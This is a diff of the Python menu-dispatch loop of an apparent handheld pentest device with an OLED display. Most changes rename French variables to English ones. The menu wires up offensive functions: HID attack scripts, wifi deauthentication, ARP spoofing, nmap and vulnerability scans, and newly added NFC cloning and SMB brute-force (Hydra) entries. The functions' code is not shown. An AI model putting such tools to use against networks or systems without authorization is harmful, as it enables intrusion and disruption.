+            cursor = 1
     #-----------
     if selection == 1:
         # une option du menu a ete validee on va calculer la page correspondante
             if page == 7:
                 #system menu
-                if curseur == 1:
+                if cursor == 1:
                     sysinfos()
-                if curseur == 2:
+                if cursor == 2:
                     brightness = OLEDContrast(brightness)
-                if curseur == 3:
+                if cursor == 3:
                     #os detection
                     Osdetection()
-                if curseur == 4:
+                if cursor == 4:
                     SreenOFF()
-                if curseur == 5:
+                if cursor == 5:
                     KeyTest()
-                if curseur == 6:
+                if cursor == 6:
                     #cmd = "reboot"
                     #subprocess.check_output(cmd, shell = True )
                     restart()
-                if curseur == 7:
-                    exit()
-                    cmd = "poweroff"
+                if cursor == 7:
+                    #exit()
+                    cmd = "shutdown now"
                     execcmd(cmd)
 
             if page == 14:
                 #HID related menu
-                if curseur == 1:
+                if cursor == 1:
                     #run hid script
                     runhid()
-                if curseur == 2:
+                if cursor == 2:
                     #gamepad
                     Gamepad()
-                if curseur == 3:
+                if cursor == 3:
                     #mouse
                     Mouse()
-                if curseur == 4:
+                if cursor == 4:
                     #Set typing speed
                     SetTypingSpeed()
             if page == 21:
-                if curseur == 1:
+                if cursor == 1:
                     #SSID LIST
                     scanwifi()
-                if curseur == 2:
+                if cursor == 2:
                     hostselect()
-                if curseur == 3:
+                if cursor == 3:
                     nmap()
-                if curseur == 4:
+                if cursor == 4:
                     vulnerabilityScan()
-                if curseur == 5:
+                if cursor == 5:
                     deauther()
-                if curseur == 6:
+                if cursor == 6:
                     deautherClient()
             if page == 28:
                     #trigger section
-                if curseur == 1:
+                if cursor == 1:
                     trigger1()
             if page == 35:
                 #template section menu
-                if curseur == 1:
+                if cursor == 1:
                     #FULL_SETTINGS
                     template = templateSelect("FULL_SETTINGS")
                     if template!="":
                         ApplyTemplate(template,"f")
-                if curseur == 2:
+                if cursor == 2:
                     #BLUETOOTH
                     template = templateSelect("BLUETOOTH")
                     if template!="":
                         ApplyTemplate(template,"b")
-                if curseur == 3:
+                if cursor == 3:
                     #USB
                     template = templateSelect("USB")
                     print(template)
                     if template!="":
                         ApplyTemplate(template,"u")
-                if curseur == 4:
+                if cursor == 4:
                     #WIFI
                     template = templateSelect("WIFI")
                     if template!="":
                         ApplyTemplate(template,"w")
-                if curseur == 5:
+                if cursor == 5:
                     #TRIGGER_ACTIONS
                     template = templateSelect("TRIGGER_ACTIONS")
                     if template!="":
                         ApplyTemplate(template,"t")
-                if curseur == 6:
+                if cursor == 6:
                     #NETWORK
                     template = templateSelect("NETWORK")
                     if template!="":
                         ApplyTemplate(template,"n")
             if page == 42:
                 #infosec commands
-                if curseur == 1:
+                if cursor == 1:
                     arpSpoof()
 
 
             if (page == 56):
-                if curseur == 1:
+                if cursor == 1:
                     nmapLocal()
+                if cursor == 2:
+                    nfc_clone()
+                if cursor == 3:
+                    nfc_write()
+                if cursor == 4:
+                    SMBrute()
+                if cursor == 5:
+                    HydraSMB()
+              
 
-
-
+                    
 
 
             #main menus section
             if (page == 49):
-                if curseur == 1:
+                if cursor == 1:
                     page = 56
-                if curseur == 7:
+                if cursor == 7:
                     update()
 
             if page == 0:
             #we are in main menu
-                if curseur == 1:
+                if cursor == 1:
                     # call about
                     about()
-                if curseur == 2:
+                if cursor == 2:
                     #system menu
                     page = 7
-                    curseur = 1
-                if curseur == 3:
+                    cursor = 1
+                if cursor == 3:
                 #hid attacks menu
                     page = 14
-                    curseur = 1
-                if curseur == 4:
+                    cursor = 1
+                if cursor == 4:
                     page = 21
-                    curseur = 1
-                if curseur == 5:
+                    cursor = 1
+                if cursor == 5:
                     page = 28
-                    curseur = 1
-                if curseur == 6:
+                    cursor = 1
+                if cursor == 6:
                     page = 35
-                    curseur = 1
-                if curseur == 7:
+                    cursor = 1
+                if cursor == 7:
                     page = 42
-                    curseur = 1
-                print(page+curseur)
-    ligne[1]=switch_menu(page)
-    ligne[2]=switch_menu(page+1)
-    ligne[3]=switch_menu(page+2)
-    ligne[4]=switch_menu(page+3)
-    ligne[5]=switch_menu(page+4)
-    ligne[6]=switch_menu(page+5)
-    ligne[7]=switch_menu(page+6)
+                    cursor = 1
+                print((page+cursor))
+    line[1]=switch_menu(page)
+    line[2]=switch_menu(page+1)
+    line[3]=switch_menu(page+2)
+    line[4]=switch_menu(page+3)
+    line[5]=switch_menu(page+4)
+    line[6]=switch_menu(page+5)
+    line[7]=switch_menu(page+6)
     #add curser on front on current selected line
     for n in range(1,8):
-        if page+curseur == page+n:
+        if page+cursor == page+n:
             if page == 1:
                 if readCapacity(bus) < 16:
-                    ligne[n] = ligne[n].replace("_","!")
+                    line[n] = line[n].replace("_","!")
                 else:
-                    ligne[n] = ligne[n].replace("_",">")
+                    line[n] = line[n].replace("_",">")
             else:
-                ligne[n] = ligne[n].replace("_",">")
+                line[n] = line[n].replace("_",">")
         else:
-            ligne[n] = ligne[n].replace("_"," ")
-    DisplayText(ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6],ligne[7])
-    #print(page+curseur) #debug trace menu value
+            line[n] = line[n].replace("_"," ")
+    DisplayText(line[1],line[2],line[3],line[4],line[5],line[6],line[7])
+    #print(page+cursor) #debug trace menu value
     time.sleep(0.1)
     selection = 0
 GPIO.cleanup()
